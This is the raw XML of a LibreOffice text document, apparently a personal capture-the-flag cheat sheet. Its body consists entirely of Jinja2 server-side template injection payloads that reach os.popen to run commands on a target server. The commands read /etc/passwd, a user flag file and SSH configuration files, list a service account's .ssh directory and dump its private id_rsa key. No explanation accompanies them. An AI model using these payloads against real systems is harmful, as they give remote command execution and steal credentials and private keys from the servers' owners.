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" svg:font-family="Cor"/>
    <style:font-face style:name="Corier" svg:font-family="Corier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Courier" fo:font-size="36pt" style:font-size-asian="31.5pt" style:font-size-complex="36pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Courier" fo:font-size="36pt" officeooo:paragraph-rsid="001b7be3" style:font-size-asian="31.5pt" style:font-size-complex="36pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Courier" fo:font-size="36pt" officeooo:paragraph-rsid="001e1bca" style:font-size-asian="31.5pt" style:font-size-complex="36pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001b7b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dc65"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="001e1b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pan text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('id').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T1">cat /etc/passwd</text:span>').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T3">cat /home/svc_acc/user.txt</text:span>').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T4">cat</text:span><text:span text:style-name="T3"> /etc/ssh/sshd_config</text:span>').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T4">cat</text:span><text:span text:style-name="T3"> /etc/ssh/ssh_config</text:span>').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T4">ls -la</text:span><text:span text:style-name="T3"> /home/svc_acc/.</text:span><text:span text:style-name="T4">ssh/</text:span>').read() <text:span text:style-name="T1">}}</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">{{ </text:span>self.<text:span text:style-name="T2">_</text:span>TemplateReference<text:span text:style-name="T2">__</text:span>context.cycler.<text:span text:style-name="T2">__</text:span>init<text:span text:style-name="T2">__</text:span>.<text:span text:style-name="T2">__</text:span>globals<text:span text:style-name="T2">__</text:span>.os.popen('<text:span text:style-name="T4">cat</text:span><text:span text:style-name="T3"> /home/svc_acc/.</text:span><text:span text:style-name="T4">ssh/id_rsa</text:span>').read() <text:span text:style-name="T1">}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" svg:font-family="Cor"/>
    <style:font-face style:name="Corier" svg:font-family="Corier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10:00:07.478796298</meta:creation-date>
    <dc:date>2022-06-09T10:49:02.704441788</dc:date>
    <meta:editing-duration>PT17M54S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="7" meta:word-count="28" meta:character-count="747" meta:non-whitespace-character-count="726"/>
    <meta:generator>LibreOffice/7.3.4.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>